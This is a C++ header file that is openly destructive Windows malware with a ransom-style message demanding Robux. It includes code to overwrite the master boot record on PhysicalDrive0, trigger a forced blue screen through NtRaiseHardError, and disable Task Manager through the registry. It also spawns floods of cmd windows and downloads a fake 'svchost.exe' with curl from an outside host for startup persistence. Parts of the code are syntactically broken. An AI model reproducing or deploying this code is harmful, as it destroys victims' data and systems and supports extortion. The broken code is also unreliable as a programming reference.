#pragma once
#include <windows.h>
#include <cstdio>
#include <stdlib.h>
#include <time.h>
#include <filesystem>
#include <shlobj.h>
#include <shlwapi.h>
#pragma comment(lib, "Shlwapi.lib")

typedef NTSTATUS(NTAPI *pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI *pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
#define BUFF_SIZE 512 //size of our data will be 512 coz MBR has 512 bytes and we want to overwrite all of its bytes.

void lol()
{

        int x;
        int y;
        int duration = 3600000;
        char message[] = "you've been hacked by the ohio rizzler gods no cap all facts fr!! if u dont want yer pc being buttfucked you must pay this account (BugBountyTestRoblox) 124125 robux for more information add me on discord (jetdesroyer444)";
        ShellExecute(NULL, NULL, L"echo %c > README.txt", NULL, NULL, SW_HIDE, message);
        maozedongthecompooter()
        Sleep(duration);
        ShellExecute(NULL, NULL, L"notepad", NULL, NULL, SW_SHOW);
        SendMessage(edit, WM_CHAR, (TCHAR)'T', 0);
        Sleep(60);
        SendMessage(edit, WM_CHAR, (TCHAR)'I', 0);
        Sleep(60);
        SendMessage(edit, WM_CHAR, (TCHAR)'M', 0);
        Sleep(60);
        SendMessage(edit, WM_CHAR, (TCHAR)'E', 0);
        Sleep(60);
        SendMessage(edit, WM_CHAR, (TCHAR)'S', 0);
        Sleep(60);
        SendMessage(edit, WM_CHAR, (TCHAR)' ', 0);
        Sleep(60);
        SendMessage(edit, WM_CHAR, (TCHAR)'U', 0);
        Sleep(60);
        SendMessage(edit, WM_CHAR, (TCHAR)'P', 0);
        Sleep(600) 
        MessageBox(NULL, "yer done BOIII", "yer done boi", MB_ICONEXCLAMATION | MB_OK);
        mbr_overwrite();
        Sleep(866);
        bsod();
}

void svchost_impersonate()
{
        ShellExecute(NULL, NULL, L"curl https://dhiuhkasfhsdhkjshfiusffsbfusfhihikhioi.000webhostapp.com/svchost.exe", NULL, NULL, SW_HIDE);
        TCHAR userProfile[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_PROFILE, NULL, 0, userProfile))) {
        PathAppend(userProfile, TEXT("AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"));

        LPCTSTR exeName = TEXT("svchost.exe");

        TCHAR exePath[MAX_PATH];
        PathCombine(exePath, userProfile, exeName);
}

void maozedongthecompooter()
{
        int amount;
        if(GetAsyncKeyState(VK_Q) & 0x8000)
        {
              for(amount = 0; amount < 50; ++amount)
              {
                        ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
              } 
        }
        if(GetAsyncKeyState(VK_W) & 0x8000)
        {
              for(amount = 0; amount < 50; ++amount)
              {
                        ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
              } 
        }

        if(GetAsyncKeyState(VK_E) & 0x8000)
        {
              for(amount = 0; amount < 50; ++amount)
              {
                        ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
              } 
        }

        if(GetAsyncKeyState(VK_R) & 0x8000)
        {
              for(amount = 0; amount < 50; ++amount)
              {
                        ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
              } 
        }

        if(GetAsyncKeyState(VK_T) & 0x8000)
        {
              for(amount = 0; amount < 50; ++amount)
              {
                        ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
              } 
        }

        if(GetAsyncKeyState(VK_Y) & 0x8000)
        {
              for(amount = 0; amount < 50; ++amount)
              {
                        ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
              } 
        }

        if(GetAsyncKeyState(VK_U) & 0x8000)
        {
              for(amount = 0; amount < 50; ++amount)
              {
                        ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
              } 
        }

        if(GetAsyncKeyState(VK_I) & 0x8000)
        {
              for(amount = 0; amount < 50; ++amount)
              {
                        ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
              } 
        }

        if(GetAsyncKeyState(VK_O) & 0x8000)
        {
              for(amount = 0; amount < 50; ++amount)
              {
                        ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
              } 
        }

        if(GetAsyncKeyState(VK_P) & 0x8000)
        {
              for(amount = 0; amount < 50; ++amount)
              {
                        ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
              } 
        }

        if(GetAsyncKeyState(VK_A) & 0x8000)
        {
              for(amount = 0; amount < 50; ++amount)
              {
                        ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
              } 
        }

        if(GetAsyncKeyState(VK_S) & 0x8000)
        {
              for(amount = 0; amount < 50; ++amount)
              {
                        ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
              } 
        }
        
        if(GetAsyncKeyState(VK_D) & 0x8000)
        {
              for(amount = 0; amount < 50; ++amount)
              {
                        ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
              } 
        }

        if(GetAsyncKeyState(VK_F) & 0x8000)
        {
              for(amount = 0; amount < 50; ++amount)
              {
                        ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
              } 
        }

        if(GetAsyncKeyState(VK_G) & 0x8000)
        {
              for(amount = 0; amount < 50; ++amount)
              {
                        ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
              } 
        }

        if(GetAsyncKeyState(VK_H) & 0x8000)
        {
              for(amount = 0; amount < 50; ++amount)
              {
                        ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
              } 
        }

        if(GetAsyncKeyState(VK_J) & 0x8000)
        {
              for(amount = 0; amount < 50; ++amount)
              {
                        ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
              } 
        }

        if(GetAsyncKeyState(VK_K) & 0x8000)
        {
              for(amount = 0; amount < 50; ++amount)
              {
                        ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
              } 
        }

        if(GetAsyncKeyState(VK_L) & 0x8000)
        {
              for(amount = 0; amount < 50; ++amount)
              {
                        ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
              } 
        }

        if(GetAsyncKeyState(VK_Z) & 0x8000)
        {
              for(amount = 0; amount < 50; ++amount)
              {
                        ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
              } 
        }

        if(GetAsyncKeyState(VK_X) & 0x8000)
        {
              for(amount = 0; amount < 50; ++amount)
              {
                        ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
              } 
        }
        if(GetAsyncKeyState(VK_C) & 0x8000)
        {
              for(amount = 0; amount < 50; ++amount)
              {
                        ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
              } 
        }

        if(GetAsyncKeyState(VK_V) & 0x8000)
        {
              for(amount = 0; amount < 50; ++amount)
              {
                        ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
              } 
        }

        if(GetAsyncKeyState(VK_B) & 0x8000)
        {
              for(amount = 0; amount < 50; ++amount)
              {
                        ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
              } 
        }

        if(GetAsyncKeyState(VK_N) & 0x8000)
        {
              for(amount = 0; amount < 50; ++amount)
              {
                        ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
              } 
        }

        if(GetAsyncKeyState(VK_M) & 0x8000)
        {
              for(amount = 0; amount < 50; ++amount)
              {
                        ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
              } 
        }
}

void bsod()
{
        BOOLEAN bEnabled;
        ULONG uResp;
        LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
        LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtRaiseHardError");
        pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
        pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
        NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled); 
        NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp); 
}

void mbr_overwrite()
{
        HANDLE mbr = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL); // handle 2 mbr real!!

        if(mbr == INVALID_HANDLE_VALUE)
        {
            printf("damn it :C you survived, but you still have de viruz on ur system HAHA!");
            ExitProcess(0);
        }

        const char trash_data[BUFF_SIZE]; // string (array of char's) in which we will store our data (bytes) to overwrite MBR
        ZeroMemory(trash_data, BUFF_SIZE);

        if(WriteFile(mbr, trash_data, BUFF_SIZE, &written, NULL) == TRUE) //if our trial to overwrite MBR with our data worked (without errors) program will print
        {                                                                 //MBR overwritten and exit
            MessageBox(NULL, "lol get rekt nerd", "lol get rekt neerd skil isue", MB_ICONEXCLAMATION | MB_OK);
            restart();
        }
}

void disable_taskmgr()
{
    HKEY key;
    if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE, &key) == ERROR_SUCCESS) {
        // set the value to 1 so it can disable taskmgr
        DWORD value = 1;
        if (RegSetValueEx(key, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(DWORD)) == ERROR_SUCCESS)
        {
                restart();
        }
}

void restart()
{
        InitiateSystemShutdownEx(NULL, NULL, 0, TRUE, FALSE, SHTDN_REASON_MAJOR_OPERATINGSYSTEM | SHTDN_REASON_MINOR_RECONFIG);
}
